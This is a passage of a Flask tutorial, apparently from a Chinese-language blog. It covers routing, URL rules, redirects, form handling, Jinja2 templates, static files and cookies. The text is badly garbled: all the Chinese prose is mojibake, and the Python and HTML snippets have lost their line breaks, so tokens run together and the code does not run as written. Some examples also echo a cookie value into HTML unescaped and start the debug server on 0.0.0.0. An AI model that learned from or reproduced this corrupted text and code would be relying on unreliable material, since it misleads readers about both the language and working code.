options)</code>ï¼šè¯¥å‡½æ•°ä¸º<code>Flask</code>ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå‘Šè¯‰åº”ç”¨ç¨‹åºå“ªä¸ªURLåº”è¯¥è°ƒç”¨ç›¸å…³çš„å‡½æ•°</p><ul><li><strong>rule</strong>ï¼šå‚æ•°è¡¨ç¤ºä¸è¯¥å‡½æ•°çš„URLç»‘å®š</li><li><strong>endpoint</strong>ï¼šè¢«æ³¨å†Œçš„urlçš„åå­—ï¼Œä¸€èˆ¬ç”¨æ¥åå‘ç”Ÿæˆurlçš„æ—¶å€™ä½¿ç”¨ï¼Œé»˜è®¤æŠŠè§†å›¾å‡½æ•°çš„åå­—ä½œä¸ºendpointï¼Œå¦‚:endpoint=â€loginâ€</li><li><strong>options</strong>ï¼šæ˜¯è¦è½¬å‘ç»™åŸºç¡€Ruleå¯¹è±¡çš„å‚æ•°åˆ—è¡¨ã€‚</li></ul><p>ä¸Šé¢çš„<code>&#39;/&#39;</code>è¡¨ç¤ºURLä¸hello_worldå‡½æ•°ç»‘å®šï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€webæœåŠ¡å™¨çš„ä¸»é¡µæ—¶ï¼Œå°†å‘ˆç°è¯¥å‡½æ•°çš„è¾“å‡º</p><p><code>app.run(host, port, debug, options)</code>ï¼šè¡¨ç¤ºæœ¬åœ°å¼€å‘æœåŠ¡å™¨ä¸Šè¿è¡Œåº”ç”¨ç¨‹åº</p><ul><li><strong>host</strong>ï¼šè¦ç›‘å¬çš„ä¸»æœºåã€‚ é»˜è®¤ä¸º127.0.0.1ï¼ˆlocalhostï¼‰ã€‚è®¾ç½®ä¸ºâ€œ0.0.0.0â€ä»¥ä½¿æœåŠ¡å™¨åœ¨å¤–éƒ¨å¯ç”¨</li><li><strong>port</strong>ï¼šç«¯å£è®¾ç½®ï¼Œé»˜è®¤å€¼ä¸º5000</li><li><strong>debug</strong>ï¼šé»˜è®¤ä¸ºfalseã€‚ å¦‚æœè®¾ç½®ä¸ºtrueï¼Œåˆ™æä¾›è°ƒè¯•ä¿¡æ¯</li><li><strong>options</strong>ï¼šè¦è½¬å‘åˆ°åº•å±‚çš„WerkzeugæœåŠ¡å™¨ã€‚</li></ul><p>æµè§ˆå™¨è®¿é—®<code>http://127.0.0.1:5000/</code>å³å¯çœ‹åˆ°å‡½æ•°çš„è¾“å‡º</p><h2 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment">#@app.route('/hello')  #æ·»åŠ è·¯ç”±</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World'</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">,</span><span class="token string">'hello'</span><span class="token punctuation">,</span>view_func<span class="token operator">=</span>hello_world<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>ï¼šè¯¥æ–¹æ³•ä¸routeç±»ä¼¼</p><ul><li><strong>rule</strong>ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼çš„urlè§„åˆ™ï¼Œå¦‚ï¼šâ€/loginâ€</li><li><strong>endpoint</strong>ï¼šurlè§„åˆ™çš„åå­—ï¼Œç”¨æ¥åå‘ç”Ÿæˆurlä½¿ç”¨ï¼Œé»˜è®¤æ˜¯è§†å›¾å‡½æ•°çš„åå­—ã€‚</li><li><strong>view_func</strong>ï¼šè§†å›¾å‡½æ•°ï¼Œå½“å¯¹åº”çš„endpointåå­—è¢«è¯·æ±‚æ—¶éœ€è¦è°ƒç”¨çš„å‡½æ•°ã€‚</li><li><strong>options</strong>ï¼š ç±»ä¼¼routeæ—¶å€™çš„optionsï¼Œmethodså‚æ•°é»˜è®¤æ˜¯åªç›‘å¬get</li></ul><h2 id="å˜é‡è§„åˆ™"><a href="#å˜é‡è§„åˆ™" class="headerlink" title="å˜é‡è§„åˆ™"></a>å˜é‡è§„åˆ™</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello &#123; &#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>åœ¨æµè§ˆå™¨è¾“å…¥<code>http://127.0.0.1:5000/hello/flask</code>åˆ™ä¼šæ˜¾ç¤º<code>Hello flask</code></p><p>é™¤äº†é»˜è®¤å­—ç¬¦ä¸²å˜é‡éƒ¨åˆ†ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è½¬æ¢å™¨æ„å»ºè§„åˆ™ï¼š</p><ul><li><strong>int</strong>ï¼šæ¥å—æ•´æ•°ï¼Œä¸ä¸ºæ•´æ•°åˆ™404ï¼Œ<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li><li><strong>float</strong>ï¼šæ¥å—æµ®ç‚¹æ•°ï¼Œä¸ä¸ºæµ®ç‚¹æ•°åˆ™404ï¼Œ<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li><li><strong>path</strong>ï¼šæ¥å—ç”¨ä½œç›®å½•åˆ†éš”ç¬¦çš„æ–œæ ï¼Œ<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li></ul><h2 id="URLæ„å»º"><a href="#URLæ„å»º" class="headerlink" title="URLæ„å»º"></a>URLæ„å»º</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_forapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/name'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'hello Admin'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/guest/&lt;guest>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_guest</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Hello &#123; &#125; as Guest'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#redirectå‡½æ•°ç›´æ¥å¯¹routeçš„è·¯å¾„è¿›è¡Œè®¿é—®ï¼Œurl_forç›´æ¥å¯¹å‡½æ•°è¿›è¡Œè®¿é—®ï¼Œä¸€åŒä½¿ç”¨åˆ™è®¿é—®æ­¤è·¯å¾„ä¸‹çš„å‡½æ•°</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_guest'</span><span class="token punctuation">,</span>guest <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>redirect(location, code=302, Response=None)</code>ï¼šè¯¥å‡½æ•°ç”¨æ¥å®ç°é‡å®šå‘åŠŸèƒ½</p><ul><li><strong>location</strong>ï¼šä¸€ä¸ªé“¾æ¥åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨url_for()å‡½æ•°å¾—åˆ°ï¼Œä¹Ÿå¯ä»¥æ˜¯é™æ€æ–‡ä»¶åœ°å€</li><li><strong>code</strong>ï¼šå¯ä»¥å–å€¼ä¸º301ã€302ã€303ã€305ã€307ï¼Œé»˜è®¤302,300ã€304ä¸å¯ä»¥</li><li><strong>Response</strong>ï¼šä¸€ä¸ªå“åº”ç±»ï¼Œé»˜è®¤æ˜¯werkzeug.wrappers.Response</li></ul><p>è¾“å…¥<code>http://127.0.0.1:5000/user/admin</code>åˆ™ä¼š302é‡å®šå‘åˆ°<code>http://127.0.0.1:5000/name</code>æ˜¾ç¤ºhello Admin</p><p><code>http://127.0.0.1:5000/user/flask</code>åˆ™ä¼š302é‡å®šå‘åˆ°<code>http://127.0.0.1:5000/guest/flask</code>ï¼Œæ˜¾ç¤ºHello flask as Guest</p><h2 id="HTTPæ–¹æ³•"><a href="#HTTPæ–¹æ³•" class="headerlink" title="HTTPæ–¹æ³•"></a>HTTPæ–¹æ³•</h2><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªHTMLè¡¨å•ï¼Œä½¿ç”¨POSTæ–¹æ³•å°†è¡¨å•æ•°æ®å‘é€åˆ°URLï¼Œå‘½åä¸ºlogin.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>http://localhost:5000/login<span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Enter Name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>nm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'welcome &#123; &#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>       user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'nm'</span><span class="token punctuation">]</span>  <span class="token comment">#è·å–å‚æ•°nmçš„å€¼</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span>name <span class="token operator">=</span> user<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       user <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nm'</span><span class="token punctuation">)</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span>name <span class="token operator">=</span> user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><strong>Request</strong>å¯¹è±¡</p><ul><li><strong>Form</strong>ï¼šæ˜¯ä¸€ä¸ªå­—å…¸å¯¹è±¡,åŒ…å«è¡¨å•å‚æ•°åŠå…¶å€¼çš„é”®å’Œå€¼å¯¹ã€‚</li><li><strong>args</strong>ï¼šè§£ææŸ¥è¯¢å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œæ˜¯åŒ…å«è¡¨å•å‚æ•°å¯¹åŠå…¶å¯¹åº”å€¼å¯¹çš„åˆ—è¡¨çš„å­—å…¸å¯¹è±¡</li><li><strong>Cookies</strong>ï¼šä¿å­˜Cookieåç§°å’Œå€¼çš„å­—å…¸å¯¹è±¡ã€‚</li><li><strong>files</strong>ï¼šä¸ä¸Šä¼ æ–‡ä»¶æœ‰å…³çš„æ•°æ®ã€‚</li><li><strong>method</strong>ï¼šå½“å‰è¯·æ±‚æ–¹æ³•ã€‚</li></ul><p>è¾“å…¥flaskå›è½¦åå…ˆè·³è½¬åˆ°<code>http://127.0.0.1:5000/login</code>ç„¶åè‡ªåŠ¨POSTä¸€ä¸ªnmå‚æ•°å302é‡å®šå‘åˆ°<code>http://127.0.0.1:5000/success/flask</code>è¾“å‡ºwelcome flask</p><h2 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'&lt;h1>Hello World&lt;/h1>'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>è®¿é—®ç½‘ç«™ä¼šå¾—åˆ°ä¸€ä¸ªHello Worldæ ‡é¢˜ï¼Œä½†è¿™æ ·å§æ ‡ç­¾æ’å…¥åœ¨pythonä»£ç ä¸­å°±å¾ˆéº»çƒ¦ï¼Œäºæ˜¯è¿™é‡Œå°±å¼•å…¥äº†<strong>Jinja2</strong>æ¨¡æ¿å¼•æ“ï¼Œå¯ä»¥é€šè¿‡<strong>render_template()</strong>å‡½æ•°å‘ˆç°HTMLæ–‡ä»¶ã€‚</p><p>æ–°å»ºä¸€ä¸ªtemplatesæ–‡ä»¶å¤¹ï¼Œåœ¨å…¶ä¸­å»ºç«‹ä¸€ä¸ªhello.htmlæ–‡ä»¶ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello &#123; &#123;  marks &#125;&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;score>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>score<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>marks <span class="token operator">=</span> score<span class="token punctuation">)</span><span class="token comment">#è‡ªåŠ¨å¯»æ‰¾ç›®å½•ä¸‹çš„templatesæ–‡ä»¶å¤¹ä¸‹çš„htmlæ–‡ä»¶</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>è®¿é—®<code>http://127.0.0.1:5000/hello/flask</code>åˆ™ä¼šè¾“å‡º<code>Hello flask!</code>æ ‡é¢˜</p><p><strong>Jinja2</strong>æ¨¡æ¿å¼•æ“ä½¿ç”¨ä»¥ä¸‹åˆ†éš”ç¬¦ä»HTMLè½¬ä¹‰ã€‚</p><ul><li><strong><code>&#123;% ... %&#125;</code></strong>ï¼šç”¨äºè¯­å¥</li><li><strong><code>&#123;&#123;  ... &#125;&#125;</code></strong>ï¼šç”¨äºè¡¨è¾¾å¼å¯ä»¥æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º</li><li><strong><code>&#123;# ... #&#125;</code></strong>ï¼šç”¨äºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š</li><li><strong><code># ... ##</code></strong>ï¼šç”¨äºè¡Œè¯­å¥</li></ul><p>å¦å¤–æµ‹è¯•è¯­å¥æ•ˆæœï¼Œä¿®æ”¹hello.htmlä¸ºä»¥ä¸‹å†…å®¹</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>&#123;% if marks>50 %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> Your result is pass!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&#123;% else %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Your result is fail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&#123;% endif %&#125;</code></pre><p>è„šæœ¬ä¸­<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>ä¿®æ”¹ä¸º<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p><p>åˆ™å½“è®¿é—®<code>http://127.0.0.1:5000/hello/1</code>æ—¶è¾“å‡º<code>Your result is fail</code></p><p>åˆ™å½“è®¿é—®<code>http://127.0.0.1:5000/hello/100</code>æ—¶è¾“å‡º<code>Your result is pass!</code></p><p>æ³¨æ„è¿™é‡Œå¿…é¡»è¦å¯¹ä¼ å…¥çš„scoreå®šä¹‰ä¸ºintå‹ï¼Œå¦åˆ™ä¼šè¢«å½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œå°±ä¼šä¸€ç›´è¾“å‡º<code>Your result is pass!</code></p><h2 id="é™æ€æ–‡ä»¶"><a href="#é™æ€æ–‡ä»¶" class="headerlink" title="é™æ€æ–‡ä»¶"></a>é™æ€æ–‡ä»¶</h2><p>hello.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span>          <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename = <span class="token punctuation">'</span>hello.js<span class="token punctuation">'</span>) &#125;&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>Say Hello<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>hello.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hello.html"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>è®¿é—®<code>http://127.0.0.1:5000/</code>ç‚¹å‡»Say Helloå¼¹çª—Hello World</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/setcookie'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>       user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'nm'</span><span class="token punctuation">]</span>       resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'readcookie.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'userID'</span><span class="token punctuation">,</span>user<span class="token punctuation">)</span>       <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getcookie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   name <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'userID'</span><span class="token punctuation">)</span>   a <span class="token operator">=</span> <span class="token string">"&lt;h1>welcome '&#123; &#125;'&lt;/h1>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>   <span class="token keyword">return</span> a   <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token 